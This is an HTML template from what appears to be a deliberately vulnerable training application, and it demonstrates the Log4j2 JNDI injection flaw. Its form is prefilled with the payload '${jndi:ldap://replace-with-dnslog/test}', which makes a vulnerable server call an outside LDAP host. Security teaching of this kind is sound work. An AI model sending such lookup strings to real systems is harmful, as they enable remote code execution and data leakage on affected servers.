<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<div th:replace="~{common/common::head}"></div>

<body>
<div class="layuimini-container">
    <div class="layuimini-main">
        <div class="layui-row layui-col-space15">
            <div class="layui-col-md12">
                <fieldset class="layui-elem-field layui-field-title">
                    <legend>
                        <a style="color: rgb(30 159 255)" class="log4j" th:text="#{component.log4j2.title}">Component Vulnerability - Log4j2 Deserialization</a>
                    </legend>
                    <blockquote class="layui-elem-quote layui-quote-nm"
                                style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                        <p>
                        <pre th:text="#{component.log4j2.intro}">Log4j2 contains a JNDI injection issue.</pre>
                        </p>
                    </blockquote>
                </fieldset>
            </div>
            <div class="layui-col-md12" style="margin-top: 10px">
                <div class="layui-row layui-col-space15">
                    <div class="layui-col-md6">
                        <h1><span class="iconfont icon-bug" th:text="| #{component.common.vul.title}|"> Vulnerable Scenario</span></h1>
                        <div class="layui-tab layui-tab-brief">
                            <div class="layui-tab-content">
                                <div class="layui-tab-item layui-show">
                                    <blockquote class="layui-elem-quote main_btn">
                                        <form class="layui-form" id="vul-log4j2-form" th:action="@{/log4j2/vul}" method="post"
                                              style="display: flex; justify-content: space-between;">
                                            <input type="text" style="width: 450px;" name="payload"
                                                   value='${jndi:ldap://replace-with-dnslog/test}'
                                                   autocomplete="off"
                                                   class="layui-input" id="vul-log4j2-input">
                                            <div style="display: flex; align-items: center;">
                                                <button class="layui-btn layui-btn-normal"
                                                        style="width: 100px; margin-left: 10px;"
                                                        lay-filter="vul-log4j2-submit" lay-submit="">
                                                    <span class="iconfont icon-zhihang" th:text="#{button.run}">Run</span>
                                                </button>
                                            </div>
                                        </form>
                                    </blockquote>
                                </div>

                                <div class="layui-col-md12">
                                    <div class="layui-card">
                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i><span th:text="#{common.tips}">tips</span></div>
                                        <div class="layui-card-body layui-text layadmin-text">
                                            <pre style="color: #28333e;font-size: 15px;" th:text="#{component.log4j2.tips}">Vulnerability principle and mitigation.</pre>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>

                    <div class="layui-col-md6">
                        <h1><span class="iconfont icon-code" th:text="| #{common.vulnerableCode}|"> Vulnerable Code</span></h1>
                        <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
                            <div class="code-editor" id="vulLog4j2"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>

<div th:replace="~{common/common::script}"></div>
<script type="text/javascript" th:inline="javascript">
    document.addEventListener("DOMContentLoaded", function () {

        layui.use(['layer', 'miniTab', 'common', 'form'], function () {
            var $ = layui.jquery,
                layer = layui.layer,
                miniTab = layui.miniTab,
                common = layui.common,
                form = layui.form;

            miniTab.listen();
            layer.msg(/*[[#{component.log4j2.title}]]*/ "Component Vulnerability - Log4j2 Deserialization");
            var isEnglish = /*[[${#locale.language == 'en'}]]*/ false;
            var codeSnippets = window.componentCodeSnippets || {};

            function codeSnippet(enName, zhName) {
                return codeSnippets[isEnglish ? enName : zhName] || codeSnippets[enName] || "";
            }

            var cmConfig = {
                lineNumbers: true,
                lineWrapping: false,
                indentUnit: 4,
                indentWithTabs: true,
                theme: 'juejin',
                styleActiveLine: {nonEmpty: true},
                fontSize: "18px",
                mode: "text/x-java"
            };

            var cmConfigSafe = {
                lineNumbers: true,
                lineWrapping: false,
                indentUnit: 4,
                indentWithTabs: true,
                theme: 'juejinsafe',
                styleActiveLine: {nonEmpty: true},
                fontSize: "18px",
                mode: "text/x-java"
            };

            CodeMirror(document.getElementById("vulLog4j2"), Object.assign({}, cmConfig, {
                value: codeSnippet("vulLog4j2", "vulLog4j2Zh")
            }));
            if (document.getElementById("safeLog4j2")) {
                CodeMirror(document.getElementById("safeLog4j2"), Object.assign({}, cmConfigSafe, {
                    value: codeSnippet("safeLog4j2", "safeLog4j2Zh")
                }));
            }

        });

        $('.log4j').hover(function () {
            $(this).css('cursor', 'pointer');
            layer.tips(/*[[#{component.common.attackFlow}]]*/ 'Attack Flow', this, {
                tips: [1, '#0051ff'],
                time: 2000
            });
        });

        $('.log4j').on('click', function () {
            layer.open({
                type: 1,
                title: false,
                closeBtn: 1,
                area: ['1116px', '572px'],
                shadeClose: true,
                content: '<div style="text-align: center;"><img src="/images/vul/components/log4j.png" style="width: 100%; height: 50%;"></div>'
            });
        });

    });
</script>

</body>
</html>
